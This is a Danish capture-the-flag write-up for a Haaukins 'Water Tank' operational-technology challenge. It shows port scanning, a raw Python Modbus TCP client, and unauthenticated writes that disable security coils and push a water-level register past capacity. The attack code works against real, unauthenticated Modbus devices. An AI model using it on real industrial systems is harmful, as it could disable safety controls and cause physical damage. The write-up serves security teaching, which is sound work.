Water Tank

Et read-only dashboard er ikke det samme som en sikker kontrolkanal.

Operational TechnologiesHaaukins CTF
🎓 Prøv selv først. Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.

Web-laget er kun en afspejling

http://water-tank.hkn poller /update hvert 1,5 sekund og viser security, water_level, temperature som JSON. /update er GET-only (405 på andre metoder), ingen skriv-vej via web-laget.

nmap -Pn -p1-10000 --open <ip>
# 80/tcp  open  http
# 502/tcp open  mbap        <-- Modbus TCP!

Port 502 (Modbus TCP, "mbap") er den rigtige kontrolkanal, og Modbus har INGEN indbygget autentificering i sin standardform. Kender du ikke protokollen i forvejen, er denne gennemgang af Modbus en god baggrund, før du går videre til den rå klient nedenfor.

En minimal rå Modbus-klient

Protokollen er simpel nok til en ~30-linjers rå socket-implementering (MBAP-header + funktionskode) i stedet for at kæmpe med en færdig klient-bibliotek:

import socket, struct

def send_recv(pdu, host, unit=1):
    mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, unit)
    s = socket.create_connection((host, 502), timeout=5)
    s.sendall(mbap + pdu)
    resp = s.recv(512)
    s.close()
    return resp

# navngivne hjælpere oven på send_recv:
def read_reg(addr, count=1):   # function code 0x03
    return send_recv(struct.pack(">BHH", 0x03, addr, count), host)
def write_reg(addr, value):    # function code 0x06
    return send_recv(struct.pack(">BHH", 0x06, addr, value), host)
def write_coil(addr, val):     # function code 0x05, 0xFF00=true, 0x0000=false
    return send_recv(struct.pack(">BHH", 0x05, addr, 0xFF00 if val else 0x0000), host)

Holding register 1 = temperatur, register 2 = water_level, matcher nøjagtigt web-dashboardets viste værdier (en læsning af reg 1/2 giver præcis de tal dashboardet viser). Coils fandt vi på samme måde: skriv én coil og se hvilket felt i GET /update der skifter:

write_coil(0, False); write_coil(1, False)
# GET /update ->  "security": false      (coil 0/1 styrer security-systemet)

Angrebet: sluk security, sæt water_level over kapacitet

write_coil(0, False)
write_coil(1, False)
write_reg(2, 65000)

Alle skrivninger accepteres uden auth. GET /update viser straks {"overflow":true,"security":false,...}, og hjemmesiden skifter til en overflow-visning med flaget direkte i HTML'en.

Hvad du har lært

  • Et pænt web-dashboard der KUN viser tilstand (read-only) betyder ikke at der ikke findes en separat, skrivbar kontrolkanal bagved.
  • nmap -p1-10000 fanger industrielle protokoller (Modbus/502, DNP3/20000 osv.) som normale web-scanninger overser.
  • Modbus TCP har ingen indbygget autentificering; en rå socket-implementering er ofte hurtigere end at fejlsøge et tredjeparts-bibliotek.

Hvor ses dette igen?

Den vigtigste indsigt er at skille VISNING fra KONTROL: et read-only dashboard er ikke en sikkerhedsgrænse, den rigtige styrekanal (her Modbus på 502) kan ligge helt ved siden af, uden autentificering. Derfor skal du scanne bredt (ikke kun 80/443); industrielle protokoller lever på porte almindelige web-scanninger springer over. Og Modbus er simpel nok til at en 30-linjers rå socket-klient ofte er hurtigere end at fejlsøge et bibliotek.
